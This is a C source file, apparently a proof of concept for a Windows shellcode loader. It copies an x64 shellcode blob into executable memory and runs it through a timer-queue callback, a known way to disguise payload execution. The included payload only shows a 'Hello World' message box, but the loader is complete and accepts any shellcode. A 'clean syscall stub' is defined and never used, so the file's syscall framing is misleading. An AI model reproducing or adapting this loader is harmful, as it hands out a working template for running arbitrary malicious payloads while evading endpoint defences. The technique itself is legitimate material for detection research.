#include <Windows.h>
#include <stdio.h>

// x64 MessageBox shellcode (direct execution, no patching)
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x54\x69\x6d\x65\x72\x20\x53"
    "\x79\x73\x63\x61\x6c\x6c\x21\x00\x48\x65\x6c\x6c\x6f\x20\x57"
    "\x6f\x72\x6c\x64\x21\x00";

// Clean syscall stub (no hooks)
__attribute__((naked))
VOID
TimerCallbackSyscall()
{
    __asm__ volatile(
        "mov r10, rcx\n\t"
        "mov eax, 0x18\n\t" // NtAllocateVirtualMemory syscall
        "syscall\n\t"
        "ret\n\t");
}

// Legitimate timer callback
VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
{
    // Cast parameter to shellcode pointer
    void (*shellcode_func)() = (void (*)())lpParameter;
    printf("[ Timer ] Executing shellcode from timer thread!\n");
    printf("[ Timer ] Thread ID: %d\n", GetCurrentThreadId());

    // Execute shellcode
    shellcode_func();
}

int main()
{
    HANDLE hTimerQueue = NULL;
    HANDLE hTimer = NULL;
    LPVOID remoteExecMemory = NULL;

    printf("[ Timer Queue + Direct Execution ]\n");

    // 1. Allocate executable memory for shellcode
    remoteExecMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remoteExecMemory)
    {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return -1;
    }

    memcpy(remoteExecMemory, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", remoteExecMemory);

    // 2. Create timer queue
    hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue)
    {
        printf("[-] CreateTimerQueue failed\n");
        VirtualFree(remoteExecMemory, 0, MEM_RELEASE);
        return -1;
    }
    printf("[+] Timer queue created\n");

    // 3. Create timer with shellcode address as parameter
    printf("[*] Creating timer with shellcode parameter...\n");

    BOOL success = CreateTimerQueueTimer(
        &hTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)TimerCallback, // Legitimate callback
        (PVOID)remoteExecMemory,            // Parameter = shellcode address!
        100,                                // 100ms
        0,                                  // One-shot
        WT_EXECUTEINTIMERTHREAD             // Execute on timer thread
    );

    if (!success)
    {
        printf("[-] CreateTimerQueueTimer failed: %d\n", GetLastError());
        DeleteTimerQueue(hTimerQueue);
        VirtualFree(remoteExecMemory, 0, MEM_RELEASE);
        return -1;
    }

    printf("[+] Timer created! Shellcode will execute in 100ms\n");
    printf("[+] Timer callback passes shellcode address as parameter\n");

    // 4. Wait for execution
    Sleep(500);

    // 5. Cleanup
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    VirtualFree(remoteExecMemory, 0, MEM_RELEASE);

    printf("[+] Demo complete\n");
    system("pause");
    return 0;
}

// x86_64-w64-mingw32-gcc -o timer_queue_syscall.exe timer_queue_syscall.c